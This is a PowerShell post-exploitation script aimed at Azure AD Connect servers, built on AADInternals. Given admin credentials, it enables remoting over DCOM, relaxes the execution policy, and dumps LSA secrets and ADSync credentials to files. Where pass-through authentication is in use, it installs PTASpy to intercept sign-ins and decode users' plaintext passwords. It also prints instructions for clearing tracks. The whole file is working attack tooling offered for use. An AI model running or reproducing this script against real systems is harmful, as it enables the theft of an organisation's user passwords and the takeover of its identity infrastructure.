[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$ServerName,
    [Parameter(Mandatory = $false)]
    [string]$IPAddress,
    [Parameter(Mandatory = $false)]
    [string]$Username
)

# Check for existence of parameters specified on the command line, if not prompt user for what we need
if (-not $ServerName) {
    $ServerName = Read-Host "Enter Target IP/Hostname"
}

if (-not $IPAddress) {
    $IPAddress = Read-Host "Enter your IP/Hostname"
}

if (-not $Username) {
    $Username = Read-Host "Enter Administrators username in the 'username' or 'Domain\username' format"
}

# Take in password as secure string to create PSCredential object for use throughout. Re-use this Credential.
$Password = Read-Host "Enter password" -AsSecureString
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

# Check if AADInternals module is installed
Write-Output "Checking if AADInternals is imported or  imports.."
if (-not (Get-Module -Name AADInternals -ErrorAction SilentlyContinue)) {
    # AADInternals module is not imported, so import it
    Import-Module -Name AADInternals
}
# Import the AADInternals module
Import-Module -Name AADInternals

# Establish session over DCOM to enable WinRm and quickconfig
function Invoke-CimCalls {
    $SessionArgs = @{
        ComputerName  = $ServerName
        Credential    = $Credential
        SessionOption = New-CimSessionOption -Protocol Dcom
    }

    $MethodArgs1 = @{
        ClassName     = 'Win32_Process'
        MethodName    = 'Create'
        CimSession    = New-CimSession @SessionArgs
        Arguments     = @{
            CommandLine = "powershell Set-Item wsman:\localhost\Client\TrustedHosts -Value $IPAddress -Force"
        }
    }

    $MethodArgs2 = @{
        ClassName     = 'Win32_Process'
        MethodName    = 'Create'
        CimSession    = New-CimSession @SessionArgs
        Arguments     = @{
            CommandLine = "powershell Enable-PSRemoting -Force"
        }
    }

    $MethodArgs3 = @{
        ClassName     = 'Win32_Process'
        MethodName    = 'Create'
        CimSession    = New-CimSession @SessionArgs
        Arguments     = @{
            CommandLine = "winrm quickconfig -quiet"
        }
    }

    Invoke-CimMethod @MethodArgs1
    Invoke-CimMethod @MethodArgs2
    Invoke-CimMethod @MethodArgs3
}

function Set-HostRemoting {
    Write-Output "Storing current execution policy on target and changing to unrestricted for our session.."
    $originalExecutionPolicy = Invoke-Command -ComputerName $ServerName -Credential $Credential -ScriptBlock {
        Get-ExecutionPolicy -Scope LocalMachine
    }
    Invoke-Command -ComputerName $ServerName -Credential $Credential -ScriptBlock {
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force
    }
}


function Set-Module {
    Write-Output "Installing AADInternals on remote server.."
    Invoke-Command -ComputerName $ServerName -Credential $Credential -ScriptBlock {
        Install-Module -Name AADInternals -Force; Import-Module AADInternals
    }
}

function Disable-PSRemoting {
    Write-Output "Disabling PSRemoting on remote server."
    $ScriptBlock = {
        Disable-PSRemoting -Force
    }

    Invoke-Command -ComputerName $ServerName -Credential $Credential -ScriptBlock $ScriptBlock
}

function Reset-ExecutionPolicy {
    Write-Output "Resetting ExecutionPolicy to its original state."
    Invoke-Command -ComputerName $ServerName -Credential $Credential -ScriptBlock {
        Set-ExecutionPolicy $originalExecutionPolicy -Scope LocalMachine -Force
    }
}

function Harvest-ADSyncCredentials {
    param (
        [Parameter(Mandatory=$false)]
        [System.Management.Automation.Runspaces.PSSession]$session
    )
    Write-Output "Gathering ADSync Credentials."
    Invoke-Command -Session $session -ScriptBlock {
        Get-AADIntSyncCredentials | Out-File "~\SyncCreds.txt"
    }
    return $SyncCreds
}

function Harvest-LSA {
    param (
        [Parameter(Mandatory=$false)]
        [System.Management.Automation.Runspaces.PSSession]$session
    )
    Write-Output "Attempting dump of LSA secrets and ADSync Creds"
    Invoke-Command -Session $session -ScriptBlock {
        Get-AADIntLSASecrets | Out-File "~\LSACreds.txt";
    }
    return $LSA
}
function Start-WinRMService {
    $WinRMStatus = Get-Service WinRM
    
    if ($WinRMStatus.Status -ne "Running") {
        Start-Service WinRM
        Write-Host "WinRM service started."
    } else {
        Write-Host "WinRM service is running."
    }
}

function Get-ADConnectConfiguration {
    Write-Output "Checking which configuration the ADConnect is running with.."
    $session = New-PSSession -ComputerName $ServerName -Credential $Credential
    $adsyncOutput = Invoke-Command -Session $session -ScriptBlock {
        $adsyncConnector = (Get-ADSyncConnector).Name
        if ($adsyncConnector -like "*AAD*") { 
            Write-Output "ADSync is configured for PTA." 
        } elseif ($adsyncConnector -like "*AD*") { 
            Write-Output "ADSync is configured for Password Hash Sync." 
        } else { 
            Write-Output "ADSync configuration not recognized." 
        }
    }
    if ($adsyncOutput -like "*PTA*") {
        Write-Output "Loading PTASpy to harvest credentials and disable passwords.."
        # Install-CPP2015
        Start-PTASpy
    }
    elseif ($adsyncOutput -like "*Hash*") {
        Write-Output "Server is running  Password Hash Sync.."
    }
    else {
        Write-Output "ADSync configuration not recognized."
    }
}
function Start-PTASpy {
    Write-Output "Installing PTASpy to MITM authentication.."
    Invoke-Command -Session $session -ScriptBlock {
        Install-AADIntPTASPY 
    }
}

# Function to install C++ 2015 Redis that  is required for PTASpy.dll functionality
function Install-CPP2015 {
    Write-Output "Installing C++ 2015 redistributable.."
    Invoke-Command -Session $session -ScriptBlock {
       iwr "https://download.microsoft.com/download/6/A/A/6AA4EDFF-645B-48C5-81CC-ED5963AEAD48/vc_redist.x64.exe" -o vc_redist.x64.exe;
       Start-Process vc_redist.x64.exe /install  
    }
}
function Start-Timer {
    $timer = 15 * 60
    Write-Host "PTASpy is harvesting away, this timer ends in 15 minutes or whenever you press 'q'"

    while ($timer -gt 0) {
        if ( $Host.UI.RawUI.KeyAvailable ) {
            $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            Write-Host "You have paused the timer. Press any key to resume, or 'q' to exit."
            while ($Host.UI.RawUI.KeyAvailable) {
                $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            }
            if ($key.Character -eq "q") {
                break
            }
        }
        Start-Sleep -Seconds 1
        $timer -= 1
    }
    if ($timer -le 0) {
        Write-Host "Check out decoded passwords with Get-AADIntPTASpylog -DecodePasswords"
        Write-Host "Clear your tracks: Remove-Item -r -force C:\PTASpy    then     Remove-AADIntPTASpy"
    }
}

# Check Decoded Passwords in PTA Spy log
function Get-DecodedPasswords {
    Write-Output "Getting decoded PTASpy passwords.."
    $ScriptBlock = {
        Import-Module -Name AADInternals;
        Get-AADIntPTASpylog -DecodePasswords
    }

    Invoke-Command -Session $session -ScriptBlock $ScriptBlock
}

function Check-Passwords {
    do {
        # Check decoded passwords
        Get-DecodedPasswords -session $session

        # Prompt to continue or exit
        $choice = Read-Host "Press 'Y' to check again or any other key to exit"
        if ($choice -ne 'Y') {
            break
        }

        # Start timer and decode passwords
        Start-Timer
        Decode-Passwords -session $session

        # Prompt to continue or exit
        $choice = Read-Host "Press 'Y' to remove PTASpy and delete the log or any other key to continue checking passwords"
        if ($choice -eq 'Y') {
            Remove-PTASpy -session $session
        }
    } while ($true)
}

function Remove-PTASpy {
    Write-Output "Removing PTASpy and deleting folder.."
    Invoke-Command -Session $session -ScriptBlock {
        cd C:\PTASpy; Copy-Item *.log ~\ptalog.txt -Force; Remove-AADIntPTASPY; Remove-Item -r -force C:\PTASpy 
    }
}

# Write-Output "Searching for indicators that target env is using ADConnect.."
# Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'MSOL*'} 
# Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'ADSync*'}
# Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'AZUREADSSO*'} 
# Read-Host "Press Enter to continue.." 


Start-WinRMService
Write-Output "Adding $ServerName to Trusted Hosts.."
# Set-Item -Path WSMan:\localhost\Client\TrustedHosts -Value $ServerName -Force
Set-Item wsman:\localhost\Client\TrustedHosts -Value $ServerName -Force

Write-Output "Preparing target for remoting"
Invoke-CimCalls
Set-HostRemoting

Write-Output "Installing Pre-requisites on target"
Set-Module

# Automated Actions 
# Write-Output "Harvesting target credentials to ~/SyncCreds.txt and ~/LSACreds.txt "
$session = New-PSSession -ComputerName $ServerName -Credential $Credential

# Starts PTASpy if PTA is found
Write-Output "Checking configuration and starting PTASpy if using Pass-through"
Get-ADConnectConfiguration -session $session
Write-Output "LSA"
Harvest-LSA -session $session
Write-Output "Sync Creds"
Harvest-ADSyncCredentials -session $session

# # start Timer to wait for passwords
# Write-Output "Starting timer while PTASpy does its thing.."
# Start-Timer
# # Check decoded passwords
# Get-DecodedPasswords -session $session

# Check decoded passwords
Check-Passwords -session $session

# Interactive Actions
Write-Output "Entering Interactive Session.."
Enter-PSSession $session

Read-Host "Press Enter if you're ready to remove PTASpy and delete the log."
# Remove PTASpy agent
Remove-PTASpy





# Write-Output "Disabling PSRemoting and Resetting ExecutionPolicy to former state"
# Disable-PSRemoting
# Reset-ExecutionPolicy


